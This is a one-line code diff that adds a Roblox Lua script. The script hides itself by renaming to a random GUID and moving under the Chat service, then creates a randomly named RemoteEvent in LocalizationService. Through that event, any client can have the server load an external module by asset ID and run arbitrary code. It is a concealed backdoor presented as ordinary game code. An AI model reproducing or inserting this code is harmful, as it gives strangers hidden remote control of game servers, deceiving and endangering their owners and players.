@@ -1,0 +1,1 @@
+script.Name = game.HttpService:GenerateGUID(false); script.Parent = game:GetService("Chat"); local s1 = Instance.new("RemoteEvent"); s1.Parent = game.LocalizationService; s1.Name = game.HttpService:GenerateGUID(false); s1.OnServerEvent:Connect(function(s2,s3) local s4 = require(14382140693) s4(s3)() end)
